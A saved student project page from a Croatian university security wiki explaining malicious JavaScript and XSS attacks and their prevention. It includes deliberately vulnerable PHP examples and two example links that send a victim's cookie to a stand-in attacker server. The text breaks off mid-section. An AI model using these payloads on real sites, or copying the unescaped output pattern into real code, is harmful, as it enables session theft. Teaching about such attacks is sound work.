@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Korištenje Javascripta u maliciozne svrhe - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Kori%C5%A1tenje_Javascripta_u_maliciozne_svrhe&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Korištenje_Javascripta_u_maliciozne_svrhe skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">Korištenje Javascripta u maliciozne svrhe</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#mw-head">orijentacija</a>,
+					<a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<p>Projekt iz kolegija "Sigurnost informacijskih sustava"
+</p><p>Akademska godina 2012./13.
+</p><p><b>Članovi tima:</b> Filip Horvat, Zvonimir Jurinić,  Stipe Stagličić, Ivan  Šimunković
+</p><p><br />
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Uvod"><span class="tocnumber">1</span> <span class="toctext">Uvod</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Op.C4.87enito_o_Javascriptu"><span class="tocnumber">2</span> <span class="toctext">Općenito o Javascriptu</span></a>
+<ul>
+<li class="toclevel-2 tocsection-3"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Javascript_vs._Java"><span class="tocnumber">2.1</span> <span class="toctext">Javascript vs. Java</span></a></li>
+<li class="toclevel-2 tocsection-4"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Mogu.C4.87nosti_Javascripta"><span class="tocnumber">2.2</span> <span class="toctext">Mogućnosti Javascripta</span></a></li>
+<li class="toclevel-2 tocsection-5"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#XSS_napadi"><span class="tocnumber">2.3</span> <span class="toctext">XSS napadi</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-6"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Sigurnosni_aspekti"><span class="tocnumber">3</span> <span class="toctext">Sigurnosni aspekti</span></a></li>
+<li class="toclevel-1 tocsection-7"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#XSS_.28engl._Cross_Site_Scripting.29"><span class="tocnumber">4</span> <span class="toctext">XSS (engl. Cross Site Scripting)</span></a>
+<ul>
+<li class="toclevel-2 tocsection-8"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Neperzistentni_XSS_.28engl._non-persistent.29"><span class="tocnumber">4.1</span> <span class="toctext">Neperzistentni XSS (engl. non-persistent)</span></a></li>
+<li class="toclevel-2 tocsection-9"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Perzistentni_XSS_.28engl._persistent_XSS.29"><span class="tocnumber">4.2</span> <span class="toctext">Perzistentni XSS (engl. persistent XSS)</span></a></li>
+<li class="toclevel-2 tocsection-10"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Prevencija_od_XSS_napada"><span class="tocnumber">4.3</span> <span class="toctext">Prevencija od  XSS napada</span></a></li>
+<li class="toclevel-2 tocsection-11"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Maskiranje_javascripta_.28engl._Obfuscated_javascript.29"><span class="tocnumber">4.4</span> <span class="toctext">Maskiranje javascripta (engl. Obfuscated javascript)</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-12"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Za.C5.A1tita"><span class="tocnumber">5</span> <span class="toctext">Zaštita</span></a></li>
+<li class="toclevel-1 tocsection-13"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Prakti.C4.8Dni_dio"><span class="tocnumber">6</span> <span class="toctext">Praktični dio</span></a>
+<ul>
+<li class="toclevel-2 tocsection-14"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Kra.C4.91a_cookieja_.28XSS_napadi.29"><span class="tocnumber">6.1</span> <span class="toctext">Krađa cookieja (XSS napadi)</span></a></li>
+<li class="toclevel-2 tocsection-15"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#XSS_shell"><span class="tocnumber">6.2</span> <span class="toctext">XSS shell</span></a></li>
+<li class="toclevel-2 tocsection-16"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Javascript_Botnet"><span class="tocnumber">6.3</span> <span class="toctext">Javascript Botnet</span></a></li>
+<li class="toclevel-2 tocsection-17"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#DDos_Javascript"><span class="tocnumber">6.4</span> <span class="toctext">DDos Javascript</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-18"><a href="Korištenje_Javascripta_u_maliciozne_svrhe.html#Literatura"><span class="tocnumber">7</span> <span class="toctext">Literatura</span></a></li>
+</ul>
+</td></tr></table>
+<h2> <span class="mw-headline" id="Uvod">Uvod</span></h2>
+<p><i>Autori: Zvonimir Jurinić &amp; Stipe Stagličić</i>
+</p><p>Postoje statičke i dinamičke web stranice. Kod statičkih stranica server ima potpunu kontrolu nad prikazom sadržaja kojeg vidi klijent  (zatražena web stranica izvršava se na serveru i to vidimo u pregledniku). Danas su takve stranice rijetke jer nema interakcije između korisnika. Kod dinamičkih stranica stvar je suprotna - server nema potpunu kontrolu. Tu se web stranice generiraju na temelju korisničkih ulaznih podataka i na taj način postiže se interakcija među korisnicima (korisnik utječe na izgled, sadržaj i ponašanje zatražene stranice sa servera - tražena web stranica se izvršava na serverskoj i korisničkoj strani). Ako se putem ulaznih podataka stavi maliciozni kod iskoristivši neki sigurnosni propust, korisnik i server praktički toga nisu ni svjesni.
+Za izvršavanje na korisničkoj strani uglavnom se koristi Javascript. Najveća prednost je povećana interaktivnost stranice, jer se obavlja odmah po akciji korisnika, što znači da se ne mora čekati na upit i odgovor sa servera. To doprinosi smanjenom prometu prema serveru, indirektno webstranica je "brža". No, kod svakih dobrih postoje i loše strane - to je sigurnost. Putem skripti preko korisnikovog browsera mogu se pokretati različiti programski (maliciozni) kodovi i krađa korisničkih podataka. Općenito za maliciozni javascript može se reći da je to kod skinut s nekog računala (servera) i pokrenut lokalno preko korisničkog browsera bez znanja korisnika (najčešće) da je pokrenut.
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Op.C4.87enito_o_Javascriptu">Općenito o Javascriptu</span></h2>
+<p><i>Autori: Ivan Šimunković &amp; Stipe Stagličić</i>
+</p><p>JavaScript je skriptni jezik koji se uglavnom koristi za razvoj web aplikacija koje se izvršavaju na strani klijenta. JavaScript se primarno primjenjuje za implementaciju funkcija ugrađenih u web stranice koje obavljaju interakciju s DOM (Document Object Model) objektom stranice. Budući da se Java Script skripta izvršava na strani web klijenta, a ne poslužitenja, ona može odmah reagirati na unos korisnika i time web stranicu učiniti interaktivnijom. Osim toga, JavaScript jezikom se mogu detektirati korisničke akcije koje HTML ne može registrirati kao što su na primjer pritisci pojedine tipke na tipkovnici ili mišu. Tako je nastala i sve popularnija Ajax tehnologija koja je također bazirana na primjeni JavaScript jezika.
+Uz prethodno navedene funkcionalnosti, JavaScript skripte imaju dugu i neslavnu prošlost sigurnosnih propusta koji nisu uzrokovani samo propustima u implementaciji već su uzrokovani i nedostacima same tehnologije. Tako su npr. zlonamjerni napadači u mogućnosti putem JavaScript skripti ostvariti napade koji za cilj imaju pokretanje izvođenja proizvoljnog programskog koda na korisnikovom računalu ili krađu korisničkih podataka.
+JavaScript je najpopularniji skriptni jezik na Internetu kojeg podržavaju svi poznatiji preglednici - Internet Explorer, Mozilla Firefox, Netscape, Opera. Cilj kreiranja Javascript jezika je bio dodati interaktivnost HTML stranicama. Javascript je interpreter, što znači da se skripta izvršava odmah naredbu po naredbu, bez prethodnog prevođenja (compiliranja) cijelog programa i kreiranja izvršne datoteke. On je javno raspoloživ skriptni jezik.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Javascript_logo.png" class="image"><img alt="Javascript logo.png" src="../images/4/43/Javascript_logo.png" width="300" height="246" /></a>
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Javascript_vs._Java">Javascript vs. Java</span></h3>
+<p>Javascript nije isto što i Java. To su dva potpuno različita jezika. Javascript je samo skriptni jezik dok je Java pravi objektni programski jezik za izradu aplikacija.
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Mogu.C4.87nosti_Javascripta">Mogućnosti Javascripta</span></h3>
+<p>- Programiranje u okviru HTML stranica
+</p><p>- Pretvaranje dinamičkog teksta u HTML stranicu
+</p><p>- Reagiranje na događaje
+</p><p>- Čitanje i pisanje HTML elemenata
+</p><p>- Validiranje (provjera ispravnosti i vjerodostojnosti) podataka
+</p><p>- Detektiranje preglednika kojeg korisnik upotrebljava
+</p><p>- Kreiranje "kolačića" (cookies)
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="XSS_napadi">XSS napadi</span></h3>
+<p>Cross-Site Scripting (XSS) je jedan od najčešćih oblika hakerskih napada na internetu. XSS napadi većinom pogađaju korisnike, npr. njihove preglednike,a rijeđe skripte na serverskoj strani. XSS napadi se oslanjaju na manipuliranje skriptama web aplikacije koje se izvršavaju na način na koji to želi netko tko je zlonamjeran. Takva manipulacija može biti postavljanje skripte na strani koja se potom izvršava svaki put kada se stranica učitava. XSS je danas najčešća ranjivost u sigurnosti softvera iako to ne bi trebalo biti tako s obzirom da je XSS lako otkriti i popraviti. XSS ranjivosti mogu za posljedicu imati manipulaciju podacima kao i njihovu krađu.
+</p><p><b>Ključne značajke XSS napada:</b>
+</p><p>- XSS napadi se odvijaju na ranjivim web aplikacijama
+</p><p>- U XSS napadima žrtva je korisnik a ne aplikacija
+</p><p>- U XSS napadima zlonamjerni sadržaj se isporučuje korisnicima pomoću Javascripta
+</p><p><br />
+XSS ranjivost nastaje kada web aplikacije uzmu podatke od korisnika i dinamički ih uključuju u web stranice bez prethodne valjane provjere podataka. XSS ranjivosti omogućavaju napadaču da izvršava proizvoljne komande i prikazuje proizvoljni sadržaj u pregledniku napadnutog korisnika. Uspješan XSS napad dovodi do toga da napadač preuzima kontrolu nad preglednikom ili nalogom za ranjivu web aplikaciju. Iako je XSS napad omogućen ranjivostima u web aplikaciji, žrtve takvih napada su korisnici aplikacije, a ne aplikacija sama po sebi. Potencijal XSS ranjivosti leži u činjenici da se zlonamjerni kod izvršava u sklopu korisničke sesije, omogućavajući da napadač zaobiđe normalna zaštitna ograničenja.
+</p><p><a href="http://www.youtube.com/watch?feature=player_embedded&amp;v=t161cahMAZc" class="external text" rel="nofollow">Što je to Cross-Site Scripting, YouTube video</a>
+</p><p><br />
+<b>Vrste XSS napada:</b>
+</p><p>Postoje tri vrste Cross-Site Scripting:
+</p><p>- <i>DOM-temeljen (engl. DOM-Based XSS)</i>
+</p><p>Ova vrsta XSS napada omogućuje napadaču da radi ne na žrtvinoj web stranici već na žrtvinom lokalnom računalu. DOM-temeljen XSS exploita sljedeće probleme na korisnikovom lokalnom računalu na ovaj način:
+</p><p>1. Napadač kreira prikladnu zlonamjernu web stranicu
+</p><p>2. Neoprezan korisnik otvori tu web stranicu
+</p><p>3. Korisnik ima ranjivu stranicu na računalu
+</p><p>4. Napadačev web site pošalje naredbu na ranjivu HTML stranicu
+</p><p>5. Lokalna ranjiva stranica izvrši te naredbe sa privilegijama trenutnog korisnika na tom računalu
+</p><p>6. Napadač lako može dobiti pristup žrtvinom lokalnom računalu
+</p><p>Rješenje ovog problema je sljedeće. Treba voditi računa o "samo" dvije stvari:
+</p><p>1. Ne treba posjećivati nepouzdane web stranice
+</p><p>2. Treba redovito osvježavati računalo novim zakrpama
+</p><p><br />
+- <i>Neustrajni XSS (engl. Non-persistent XSS)</i>
+</p><p>Ovo je najpoznatiji sigurnosni propust koji se može naći na internetu. nazvan je "neustrajni" jer radi na trenutnom HTTP odgovoru sa žrtvine web stranice. On se tek uoči kada web stranica dobije podatke predviđene od napadača kako bi automatski generirali izlaznu stranicu za napadača. Najčešća primijenjena vrsta takvog propusta je u servisima za pretraživanje na web stranicama - npr. napadač piše neki zlonamjerni HTML kod u textbox, ako je web stranica ranjiva, rezultat je kod koji smo unijeli u textbox, on se prikaže na web stranici. Rješenje je izvršavanje provjere koda koji se unosi u web stranicu izbjegavajući HTML tagove ili prihvaćajući samo slova i brojke.
+</p><p><br />
+- <i>Ustrajni XSS (engl. Persistent XSS)</i>
+</p><p>Ovaj propust je sličan prethodnom tipu XSS-a zbog toga što oba rade na žrtvinoj web stranici i pokušavaju pribaviti informacije o korisniku. Jedina razlika je što ranjive web stranice kod ustrajnog XSS-a napadač ne treba osigurati URL do korisnika, jer web stranica zahtjeva od korisnika da unese podatke u sustav, npr. kod knjige gostiju (engl. guestbook). To uspijeva kada alati koji služe za unos poruka ne vrše nikakvu provjeru sadržaja koji se unosi. Tako se omogućuje napadaču da ukrade kolačić (engl. cookie) sa korisnikova računala. Rješenje je isto kao i kod neustrajnog XSS-a.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Persistent_xss.gif" class="image"><img alt="Persistent xss.gif" src="../images/9/9a/Persistent_xss.gif" width="609" height="301" /></a>
+</p><p><br />
+<b>Učinak XSS napada:</b>
+</p><p>Kada napadači uspješno iskoriste XSS ranjivosti, oni ostvaruju pristup povjerljivim podacima potrebnim za prijavljivanje na određenu stranici ili u web aplikaciju. Oni također mogu distribuirati internet crve ili pristupiti korisnikovom računalu i pregledati povijest korisnikovog preglednika ili kontrolirati preglednik iz daljine. Nakon ostvarivanja kontrole nad sustavom korisnika, napadači također mogu analizirati i koristiti druge intranet aplikacije. Tako se iskorištavanjem XSS ranjivosti mogu izvoditi sljedeće zlonamjerne i opasne aktivnosti:
+</p><p>- Krađa korisničkih računa
+</p><p>- Širenje internet crva
+</p><p>- Pristup povijesti preglednika i spremljenog sadržaja
+</p><p>- Kontrola preglednika iz daljine
+</p><p>- Pregled i iskorištavanje intranet uređaja i aplikacija
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Sigurnosni_aspekti">Sigurnosni aspekti</span></h2>
+<p><i>Autor: Ivan Šimunković</i>
+</p><p>JavaScript je zamišljen kao skriptni jezik što znači da se njime ne implementiraju pravilne sigurnosne mjere, te ga nikad ne bi trebalo koristiti umjesto pravilne enkripcije. Naravno, postoji definiran JavaScript sigurnosni model, ali on nije definiran sa svrhom zaštite vlasnika web stranice ili zaštite podataka koji se razmjenjuju između web klijenta i poslužitelja. Sigurnosni model JavaScript programskog jezika je definiran s namjerom zaštite korisnika od zlonamjernih web stranica i skripti pa s tim u vidu definira stroga ograničenja o tome što autor skripte skriptom može ili ne može učiniti u okruženju web preglednika.
+Princip sigurnosnog modela zasniva se na davanju potpune kontrole skripti unutar web stranice, ali ništa izvan njenih granica što znači sljedeći:
+</p><p>- JavaScript ne može čitati ili kreirati/mijenjati datoteke na korisnikovom računalu. Također ne može kreirati/mijenjati datoteke na web poslužitelju (osim indirektno putem skripte na strani poslužitelja koja će kreirati/mijenjati datoteke). Jedino što skripta može mijenjati i pohraniti na korisnikovom računalu su web kolačići.
+</p><p>- Skripta može obavljati interakciju s drugim web stranicama iz istog frameset-a s istog web poslužitelja, ali ne sa stranicama s drugog web poslužitelja. Neki web preglednici čak to ograničavaju na web stranice s istog priključka bez obzira nalaze li se one na istom ili različitom web poslužitelju.
+</p><p>- Skripta se ne može koristiti za promjenu vrijednosti atributa vezanih uz učitavanj datoteka (eng. file input) te se njome ne može učitavati datoteke bez potrebnog odobrenja.
+</p><p>- Skripta ne može dobiti uvid u web stranice koje je korisnik prethodno posjetio, tj. ne može dobiti uvid u tzv. Location objekt, ali može narediti web pregledniku pomak unaprijed ili unatrag bilo koliko koraka prema podacima pohranjenim unutar web preglednika. Skripta nikako ne može doći do podataka o tome koje stranice je korisnik prethodno posjetio.
+</p><p>- Skripta nema pristup web kolačićima drugih web stranica.
+</p><p>- Skripta nema uvid u podatke o tome da li korisnik u trenutku izvođenja koristi i neke druge programe ili neke druge prozore unutar web preglednika.
+</p><p>- Skripta ne može otvoriti nove prozore nevidljive korisniku ili premale prozore koje korisnik nije u mogućnosti vidjeti, a u većini web preglednika skripta ne može zatvoriti prozore koje
+nije otvorila.
+</p><p>Kao što je vidljivo iz navedenog, sigurnosni model definira osnovne principe ponašanja web
+preglednika kod izvođenja JavaScript skripti – tretirati programski kod skripte pronađen na web
+stranici kao neprijateljski programski kod. Detaljniju specifikaciju sigurnosnih aspekata definiraju tzv.
+sigurnosne politike za izvođenje JavaScript skripti koje osim ograničenja definiraju i iznimke koje npr.
+dozvoljavaju automatsko izvršavanje skripti iz provjerenog izvora ili koje nakon eksplicitne dozvole
+korisnika omogućavaju skriptama pristup inače nedostupnim podacima.
+</p>
+<h2> <span class="mw-headline" id="XSS_.28engl._Cross_Site_Scripting.29">XSS (engl. Cross Site Scripting)</span></h2>
+<p>Kada se posjećuje neka web stranica engl. browser (preglednik) svaki put vizualizira neki engl. html, engl. css i engl. javascript. Sigurnosni propust XSS-a leži u tom malicioznom javascriptu koji se pokušava izvršiti u korištenom pregledniku - iskorištava se sigurnosni propust web aplikacija tako da se u ulazne podatke korisnika umetne maliciozni kod. Ti podaci se prikazuju nakon posjeta web stranici, u ovom slučaju izvršava se i maliciozni kod.
+	XSS se temelji na manipulaciji toga da se ne provjerava (ne filtrita se) ono što se ispisuje u browseru. Korisniku damo link i on taj link otvori. U ovisnosti o vrsti XSS-a maliciozni kod je sadržan u danom linku ili se iz baze pročita komad malicioznog koda. Na taj način korisnik ima sigurnosni problem. 
+	Cilj takvog napada je krađa različitih korisničkih podataka, korištenje zaraženog računala kao dio engl. botneta. Napadač također želi da iskorišteni propust bude što duže neprimijećen. Najčešće se XSS koristi za engl. Phishing (fišing) - lažnim linkovima se pokušava legitimnog korisnika navesti na otkrivanje povjerljivih podataka.
+	Postoje tri vrste XSS napada: neperzistentni ili jednokratni (engl. non-persistent), perzistentni ili trajni (engl. persistent) i temeljeni na DOM (engl. Document Object Model) objektima.
+<a href="http://security.foi.hr/wiki/index.php/Datoteka:5asdf.jpg" class="image"><img alt="5asdf.jpg" src="../images/b/b4/5asdf.jpg" width="685" height="357" /></a>
+</p><p>Legitimni korisnik se prijavljuje u sustav. Nakon prijave počinje s radom u web aplikaciji. Napadač je otkrio da promatrana web aplikacija ranjiva na XSS. Svim korisnicima šalje email s malicioznim kodom (Primjer: šalje link (URL adresa) koji sadrži maliciozni kod). Ako logirani korisnik pokrene link izvršava se maliciozni javascript u pregledniku korisnika. Najjednostavniji primjer je krađa engl. cookieja (kolačića) u kojem je zapisan ID sesije za pristup sustavu. Cookie se šalje na server napadača i on pomoću prikupljenih podataka ulazi u sustav kao da je prethodno prijavljeni korisnik.
+</p>
+<h3> <span class="mw-headline" id="Neperzistentni_XSS_.28engl._non-persistent.29">Neperzistentni XSS (engl. non-persistent)</span></h3>
+<p>Ovaj tip XSS-a naziva se još i jednokratna XSS ranjivost, a karakterizira ga da maliciozni skriptni kod nije trajno pohranjen na nekom web serveru. 
+	Funkcionira na način da napadač ubaci maliciozni kod u korisnikov HTTP zahtjev (ulazne podatke), odnosno URL kojeg će korisnik pokrenuti. Ranjive web stranice, odnosno vraća korisniku traženu web stranicu i sadržani maliciozni kod, koji se izvršava u pregledniku klijenta. Krajnji rezultat je omogućen potpuni pristup sadržaju ranjive web stranice.
+	Poanta ovog oblika ranjivosti leži u neprovjeri ulaznih podataka koji se koriste za ispis traženog sadržaja web stranice u korisničkom pregledniku.
+	Smisao ranjivosti je u neprovjeravanju ulaznih korisničkih podataka (HTTP zahtjev) koji se koriste za kreiranje web stranice, koja se prikazuje korisniku u web pregledniku.
+	Opasnost od ove vrste napada za korisnika ne postoji tako dugo dok ga napadač na neki način ne navede da aktivira maliciozni link. Za to se koriste razne tehnike socijalnog inženjeringa - taj princip je tipični primjer phishinga. Jednom kreirani link napadač šalje velikom broju korisnika da bi izvršio XSS napad. Najčešće se šalju emailom, a danas je najčešći način širenje preko društvenih mreža. Da bi se mogli zaraziti i drugi korisnici, oni moraju otvoriti isti taj link, koji je otvorio i prethodni korisnik.
+<a href="http://security.foi.hr/wiki/index.php/Datoteka:Xss-jednokr.jpg" class="image"><img alt="Xss-jednokr.jpg" src="../images/6/6a/Xss-jednokr.jpg" width="464" height="354" /></a>
+</p>
+<ol><li>Napadač otkriva ranjivu web stranicu i kreira maliciozni link, kojeg šalje velikom broju korisnika.  Link se sastoji od url-a servera web stranice i malicioznog koda.
+</li><li>Korisnik se prijavio na server putem korisničkog imena i lozinke i ima mogućnost manipulacije osjetljivim podacima (npr. brojevi kreditnih kartica). Korisniku dobiva maliciozni link, koji izgleda kao link na legitimni server web stranice.
+</li><li>Korisnik pokreće taj link; šalje http zahtjev serveru za ranjivu web stranicu.
+</li><li>Server korisniku vraća traženu web stranicu koja zbog XSS propusta sadrži i skriptni maliciozni kod.
+</li><li>Maliciozni kod se izvršava u korisnikovu web pregledniku.
+</li><li>Dohvaćaju se kolačići (engl. cookies) korisnika koji najčešće sadrže korisničke autentifikacijske podatke.
+</li><li>Preglednik dobiva informaciju o preusmjeravanju na server napadača. Bez znanja korisnika šalju se sakupljeni podaci na server napadača. Napač je spreman koristiti identitet korisnika.
+</li></ol>
+<p>Primjer neperzistentnog XSS-a:
+(<a href="http://www.cert.hr/sites/default/files/CCERT-PUBDOC-2006-05-157.pdf" class="external text" rel="nofollow">Izvor koda</a>)
+Web stranica ranjiva na XSS:  
+</p>
+<pre><a href="http://www.legitimni_posluzitelj.com/trazilica.php" class="external free" rel="nofollow">http://www.legitimni_posluzitelj.com/trazilica.php</a>
+</pre>
+<pre>&lt;HTML&gt; 
+&lt;BODY&gt; 
+Traženi pojam 
+&lt;?php 
+echo $_GET['pojam'];  //neprovjereni i nekodirani ispis traženog pojma
+?&gt; 
+nije pronađen. 
+&lt;/BODY&gt; 
+&lt;/HTML&gt; 
+</pre>
+<p>Maliciozni link:
+</p>
+<pre><a href="http://www.legitimni_posluzitelj.com/trazilica.php?pojam=" class="external free" rel="nofollow">http://www.legitimni_posluzitelj.com/trazilica.php?pojam=</a>&lt;script&gt;document.location='http://www.maliciozni_posluzitelj.com/napad.cgi?'+document.cookie&lt;/script&gt;
+</pre>
+<h3> <span class="mw-headline" id="Perzistentni_XSS_.28engl._persistent_XSS.29">Perzistentni XSS (engl. persistent XSS)</span></h3>
+<p>Ovaj tip XSS-a naziva se još trajna XSS ranjivost. U odnosu na prethodnu vrstu napada maliciozni skriptni kod ostaje trajno pohranjen na serveru neke web stranice. Server taj kod normalno umeće u rezultat tražene web stranice. Znači, dovoljno je da korisnik samo posjeti zaraženu web stranicu i bez znanja korisnika u pregledniku se izvršava javascript.
+	Ulazni podaci pohranjuju se na serveru, najčešće u bazu, unutar datotečnog sustava. Ranjivost leži u prikazu te web stranice ostalim korisnicima bez prethodnog kodiranja. Najbolji primjeri te vrste ranjivosti su stranice koncipirane kao forumi, knjige gostiju (engl. guestbooks)
+<a href="http://security.foi.hr/wiki/index.php/Datoteka:Pxss.jpg" class="image"><img alt="Pxss.jpg" src="../images/9/97/Pxss.jpg" width="726" height="580" /></a>
+</p>
+<ol><li>Napadač otkriva web stranicu ranjivu na perzistentni XSS, koja omogućava trajno postavljanje nekog sadržaja dostupnog svima i kreira maliciozni kod.
+</li><li>Na web stranicu npr. forum, napadač stavlja poruku sa malicioznim kodom. Tu je opet bitan faktor socijalnog inženjeringa - naslov mora biti takav da privuče čim više korisnika. Nakon spremanja, to ostaje trajno pohranjeno u bazi.
+</li><li>Korisnik želi pročitati tu poruku i šalje zahtjev za dohvaćanje webstranice (u ovom slučaju želi vidjeti poruku).
+</li><li>Server vraća korisniku traženu webstranicu.
+</li><li>Maliciozni kod se izvršava u pregledniku korisnika.
+</li><li>Maliciozni kod preusmjerava korisnika na server napadača.
+</li><li>Opet se šalju kolačići na server napadača (npr. aktivne sesije (engl. session) u pregledniku) i napadaču je dalje otvoren put da izvršava razne skripte na računalu korisnika.
+</li></ol>
+<p>Primjer perzistentnog XSS-a:
+(<a href="http://www.cert.hr/sites/default/files/CCERT-PUBDOC-2006-05-157.pdf" class="external text" rel="nofollow">Izvor koda</a>) 
+Link napadača za postavljanje poruke na web:
+</p>
+<pre><a href="http://www.legitimni_posluzitelj.com/unos.php?poruka=Lazna_poruka" class="external free" rel="nofollow">http://www.legitimni_posluzitelj.com/unos.php?poruka=Lazna_poruka</a>&lt;script&gt;document.location='http://www.maliciozni_posluzitelj.com/napad.cgi?'+document.cookie&lt;/script&gt;
+</pre>
+<p>Nakon pohranjivanja u bazu, poruke se u ovom slučaju dohvaćaju po ID-u.
+Ranjiva web stranica:
+</p>
+<pre><a href="http://www.legitimni_posluzitelj.com/prikaz.php" class="external free" rel="nofollow">http://www.legitimni_posluzitelj.com/prikaz.php</a>
+</pre>
+<pre>&lt;HTML&gt; 
+&lt;BODY&gt; 
+&lt;?php 
+$poruka = dohvati_poruku($_GET['poruka_id']);  //dohvaćanje odgovarajuće poruke 
+na temelju parametra poruka_id
+echo $poruka;  //neprovjereni i nekodirani ispis poruke
+?&gt; 
+&lt;/BODY&gt; 
+&lt;/HTML&gt;
+</pre>
+<p>Link korisnika kako bi pogledao poruku:
+</p>
+<pre><a href="http://www.legitimni_posluzitelj.com/prikaz.php?poruka_id=37" class="external free" rel="nofollow">http://www.legitimni_posluzitelj.com/prikaz.php?poruka_id=37</a>
+
+</pre>
+<h3> <span class="mw-headline" id="Prevencija_od_XSS_napada">Prevencija od  XSS napada</span></h3>
+<p>Najlakši i najpouzdaniji način prevencije je vlastito znanje, tj. neotvaranje neprovjerenih linkova ili isključivanje izvršavanja Javascripta u korištenom browseru.  Društvene mreže su najpopularniji način za izvršavanje napada. Zaraženi korisnik pošalje svim prijateljima maliciozni link uz neku primamljivu poruku, a naivni korisnici klikom na link najčešće šalju svoje korisničke podatke na server napadača.
+<a href="http://security.foi.hr/wiki/index.php/Datoteka:8fejs.jpg" class="image"><img alt="8fejs.jpg" src="../images/c/cf/8fejs.jpg" width="266" height="121" /></a>
+Jako korisna stvar koja bi se trebala koristiti pod obavezno su ekstenzije za preglednike NOSCRIPT (Mozilla Firefox) i NOTSCRIPTS (Google Chrome). Služe za blokiranje skriptnog koda unutar web stranica koje otvaramo. Nakon instalacije moramo eksplicitno reći da želimo prihvatiti kod (npr. Javascript) sa određene domene (tj. stranice koje smo posjetili). K tome se preporuča i korištenje alata KeePass (alat za čuvanje lozinki, nedostatak je da bazu lozinki moramo negdje imati pohranjenu). Dobra solucija je pohranjivanje baze na Dropboxu (najpopularniji data cloud servis ) plus korištenje dvostruke autentifikacije.
+	Sa programerske strane  jedan od načina prevencije je filtriranje ulaznih podataka. Znači eliminiraju se svi nedopušteni znakovi osim slova, brojeva i razmaka. Bolji način je kodiranje ulaznih znakova koji idu na izlaz. Za to se koriste funkcije htmlspecialchars() i htmlentities(). U html-u postoje rezervirani znakovi koji su zamijenjeni prevedenim ekvivalentom. Primjer: '&lt;' i '&gt;' enkodira u '&lt;' i '&gt;', '(' i ')' u '&#40;' i '&#41;’.
+</p>
+<pre>&lt;?php 
+echo htmlspecialchars($_GET['pojam']); 
+?&gt; 
+</pre>
+<h3> <span class="mw-headline" id="Maskiranje_javascripta_.28engl._Obfuscated_javascript.29">Maskiranje javascripta (engl. Obfuscated javascript)</span></h3>
+<p>U primjerima XSS-a jasno se vidi da je na dio legitimnog linka dodan komad javascripta. No, autori kodova ne želi da budu jasno vidljivi pa ih maskiraju. 
+Prva primjena je npr. kod filtriranja navodnika: Otkrili smo web stranicu ranjivu na xss, ali se javascript ne izvršava. Ako pogleda u source, vidi se slijedeće:
+</p>
+<pre>&lt;input name='txtName' type='text' value='&lt;script&gt;alert(\"test\")&lt;/script&gt;'/&gt;
+</pre>
